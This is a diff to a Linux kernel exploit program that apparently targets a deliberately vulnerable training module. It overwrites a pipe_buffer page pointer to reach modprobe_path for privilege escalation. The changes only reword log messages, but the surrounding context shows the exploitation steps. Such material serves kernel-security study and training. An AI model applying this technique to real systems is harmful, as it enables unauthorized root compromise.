@@ -381,15 +381,15 @@ int main(void)
 	 *  - DRILL_ACT_SAVE_VAL with 80 as 2nd argument starts at the offset 96,
 	 *    which is exactly at the offset 0 of the next object near drill_item_t.
 	 */
-	printf("[*] try to overwrite pipe_buffer.page after drill_item_t with 0x%lx\n",
+	printf("[!] trying to overwrite pipe_buffer.page after drill_item_t with 0x%lx...\n",
 			MODPROBE_PATH_PAGE_ADDR);
 	snprintf(act_args, sizeof(act_args), "0x%lx 80", MODPROBE_PATH_PAGE_ADDR);
 	ret = act(act_fd, DRILL_ACT_SAVE_VAL, 0, act_args);
 	if (ret == EXIT_FAILURE)
 		goto end;
-	printf("[+] DRILL_ACT_SAVE_VAL\n");
+	printf("[+] DRILL_ACT_SAVE_VAL 0x%lx to item 0 at offset 80\n", MODPROBE_PATH_PAGE_ADDR);
 
-	printf("[*] searching the corrupted pipe containing modprobe_path...\n");
+	printf("[!] searching the corrupted pipe containing modprobe_path...\n");
 	for (i = 0; i < PIPES_N; i++) {
 		/*
 		 * Read the whole page to make the kernel discard the first pipe_buffer
@@ -474,9 +474,9 @@ end:
 	}
 
 	if (result == EXIT_FAILURE)
-		printf("\n[-] exploit failed\n");
+		printf("[-] exploit failed\n");
 	else
-		printf("\n[+] success, the end\n");
+		printf("[+] success, the end\n");
 
 	ret = daemon(1, 1);
 	if (ret != 0)
